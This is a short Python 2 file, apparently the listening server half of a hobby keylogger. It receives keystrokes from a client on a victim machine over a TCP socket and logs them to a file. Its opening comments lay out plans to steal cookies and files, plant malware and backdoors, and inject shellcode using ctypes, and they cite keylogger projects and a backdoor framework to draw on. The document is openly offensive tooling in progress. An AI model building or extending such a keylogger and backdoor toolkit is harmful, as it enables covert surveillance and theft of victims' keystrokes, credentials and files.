

# recv the character or the code of key from client
# get help from the radiumkeylogger code and lazy beelogger code
# WARNING: complete this project on windows!

'''
think about all hacking ways(jab on who; see details in above msg header & use Dr0p1t framework fot all kind of backdoors; compare socket programming with msf post exploitation modules) 
think about more tips and tricks to hack using socket programming like keylogger, 
steal cookies & other files from victim machine, 
steal deleted files using a recovery app[with socket programming we can do almost anything and build smt like msf to do all these more convenient], 
upload Malware, backdoors & virus codes shellcodes on there, 
inject shellcode(send the shellcode to inject it using ctypes lib; 
see the payload.py for more details to send the payload.py using socket programming)[in all these ways u need 3 files 1) server.py 2) client.py 3) virus.exe 
which u built this virus using assembly and shellcode programming]
'''
# SOURCES & TODO:
# make it multithread tcp using this link => http://www.bogotobogo.com/python/python_network_programming_server_client_file_transfer.php
# https://www.daniweb.com/programming/software-development/threads/229564/python-keylogger
# https://blenderartists.org/t/sending-binary-file-through-sockets-python-3-not-2-x/596392/10

import socket, logging, sys

logFile = 'C:\Users\VOCFU\Desktop\log.out'
host = '127.0.0.1'
port = 8234
logging.basicConfig(filename=logFile,
                    level=logging.DEBUG,
                    format='%(message)s')


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((host, port))
s.listen(3)
conn, addr = s.accept()
print '[+] Connection Has Been Stablished By => : ', addr[0]
logging.log(10, addr[0])


while True:
	try:
		data = conn.recv(500)
		if data:
			print data
			logging.log(10,data)
	except socket.error:
		logging.log(10, '==================SOCKET-HAS-BEEN-FUCKED-UP!==================')
		print '[-] Connection At ', addr[0] , ' Broken.'
		sys.exit()
